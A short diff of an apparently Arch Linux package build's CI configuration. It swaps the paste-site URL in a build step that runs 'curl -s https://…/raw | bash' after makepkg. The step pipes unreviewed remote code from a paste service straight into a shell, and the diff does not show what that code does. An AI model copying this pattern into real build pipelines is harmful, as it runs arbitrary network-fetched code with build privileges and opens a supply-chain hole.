@@ -24,7 +24,7 @@ task:
   build_script:
       - ln -fs /usr/share/zoneinfo/Asia/Dhaka /etc/localtime && date
       - locale-gen en_US en_US.UTF-8
-      - makepkg -s && curl -s https://bin.cyberknight777.dev/v5UV/raw | bash
+      - makepkg -s && curl -s https://katb.in/eruvumefadi/raw | bash
 
   artifacts:
       path: "*.pkg.tar.zst"
